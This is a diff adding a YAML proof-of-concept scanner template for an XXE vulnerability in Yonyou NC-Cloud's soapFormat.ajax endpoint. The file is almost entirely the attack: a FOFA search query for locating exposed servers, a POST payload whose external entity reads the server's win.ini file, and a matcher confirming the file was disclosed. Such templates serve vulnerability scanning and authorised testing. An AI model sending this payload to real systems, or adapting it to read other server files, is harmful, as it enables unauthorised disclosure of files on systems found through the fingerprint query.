@@ -1,0 +1,24 @@
+id: poc-yaml-yongyou-nc-cloud-soapformat-xxe
+info:
+  name: 用友NC-Cloud soapFormat XXE漏洞
+  severity: high
+  tags:
+  - xxe
+  finger: 用友-NC-Cloud
+  fofa: body="/Client/Uclient/UClient.exe"||body="ufida.ico"||body="nccloud"||body="/api/uclient/public/"
+requests:
+- method: POST
+  path: /uapws/soapFormat.ajax
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///C://windows/win.ini"> ]><soap:Envelope
+    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a
+  expression: 'status_code == 200 &&
+
+    contains(body,"[fonts]") &&
+
+    contains(body,"[files]")
+
+    '
+variables: {}
+transport: http
